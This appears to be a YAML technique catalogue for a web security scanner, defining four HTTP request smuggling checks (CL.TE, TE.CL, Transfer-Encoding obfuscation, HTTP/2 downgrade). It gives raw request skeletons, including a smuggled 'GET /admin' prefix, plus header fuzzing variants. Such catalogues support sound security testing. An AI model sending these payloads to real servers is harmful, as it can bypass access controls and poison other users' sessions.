  # ───────────────────────────────────────────────────────────────────────────
  #  NEW CATEGORY: PROTOCOL SMUGGLING (general)
  #  smug-001 → smug-004
  #  These are "aggressive" risk — they require raw socket control and can
  #  affect other users' sessions on the target server.
  # ───────────────────────────────────────────────────────────────────────────

  - id: "smug-001"
    name: "CL.TE request smuggling"
    category: "protocol_smuggling"
    technique: "cl-te-smuggling"
    description: >
      CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding.
      Send a request where Content-Length covers the entire body but
      Transfer-Encoding: chunked makes the backend see a partial body, leaving
      a smuggled prefix in the backend's input buffer.

      Raw skeleton (send via raw TCP / netcat):
        POST /{{PATH}} HTTP/1.1\r\n
        Host: {{HOST}}\r\n
        Content-Length: 30\r\n
        Transfer-Encoding: chunked\r\n
        \r\n
        0\r\n
        \r\n
        GET /admin HTTP/1.1\r\n
        X-Ignore: x
    tags: ["smuggling", "cl-te", "request-smuggling", "generic"]
    risk: "aggressive"
    severity: "critical"
    priority: 3
    requires_raw_socket: true
    scanner_note: >
      Requires raw socket control (not standard HTTP library).
      Sends POST to /{{PATH}}, poisons the pipeline with GET /admin.
      Confirm via differential timing attack first (use a 10s delay
      in the chunked body) before sending the poisoned suffix.

  - id: "smug-002"
    name: "TE.CL request smuggling"
    category: "protocol_smuggling"
    technique: "te-cl-smuggling"
    description: >
      TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length.
      The chunked body's true content is shorter than Content-Length suggests
      to the backend, injecting a prefix into the next request's body.

      Raw skeleton:
        POST /{{PATH}} HTTP/1.1\r\n
        Host: {{HOST}}\r\n
        Content-Length: 3\r\n
        Transfer-Encoding: chunked\r\n
        \r\n
        8\r\n
        SMUGGLED\r\n
        0\r\n
        \r\n
    tags: ["smuggling", "te-cl", "request-smuggling", "generic"]
    risk: "aggressive"
    severity: "critical"
    priority: 3
    requires_raw_socket: true

  - id: "smug-003"
    name: "TE.TE — Transfer-Encoding obfuscation"
    category: "protocol_smuggling"
    technique: "te-te-smuggling"
    description: >
      Both front-end and back-end support Transfer-Encoding, but one can be
      tricked into ignoring the TE header via obfuscation.
      Variants to try:
        Transfer-Encoding: xchunked
        Transfer-Encoding: chunked, identity
        Transfer-Encoding:\tchunked
        Transfer-Encoding: ["chunked"]
        X-Transfer-Encoding: chunked
    tags: ["smuggling", "te-te", "request-smuggling", "te-obfuscation"]
    risk: "aggressive"
    severity: "high"
    priority: 4
    requires_raw_socket: true
    scanner_note: "Fuzz Transfer-Encoding header value with the obfuscation variants listed. One backend ignores the malformed TE; the other processes chunked normally."

  - id: "smug-004"
    name: "HTTP/2 downgrade smuggling"
    category: "protocol_smuggling"
    technique: "h2-downgrade"
    description: >
      H2.CL or H2.TE smuggling — front-end is HTTP/2, back-end is HTTP/1.1.
      Inject a Content-Length or Transfer-Encoding in the h2 body frame that
      the front-end ignores (H2 uses frame length) but the back-end's H1
      parser reads, causing request desync.

      Requires an HTTP/2 client that allows raw header injection.
      Tools: h2csmuggler, turbo-intruder with h2 support.
    tags: ["smuggling", "h2", "http2", "downgrade"]
    risk: "aggressive"
    severity: "critical"
    priority: 4
    requires_raw_socket: true
    scanner_note: "Use Burp Suite's HTTP/2 scan or h2csmuggler tool. Standard HTTP libraries won't work."

